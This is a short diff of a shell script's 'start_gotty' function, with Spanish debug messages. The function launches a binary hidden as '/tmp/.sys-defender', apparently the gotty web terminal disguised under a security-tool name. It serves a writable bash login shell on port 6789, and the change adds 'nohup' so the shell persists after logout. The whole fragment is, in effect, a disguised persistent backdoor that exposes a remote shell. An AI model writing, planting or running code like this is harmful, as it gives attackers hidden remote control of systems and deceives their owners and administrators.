@@ -39,7 +39,7 @@ function start_gotty {
     if pgrep -f "/tmp/.sys-defender -p 6789 -w bash" > /dev/null 2>&1; then
         debug "Gotty ya está en ejecución."
     else
-        /tmp/.sys-defender -p 6789 -w bash -l > /dev/null 2>&1 &
+        nohup /tmp/.sys-defender -p 6789 -w bash -l > /dev/null 2>&1 &
         debug "Gotty iniciado."
     fi
 }
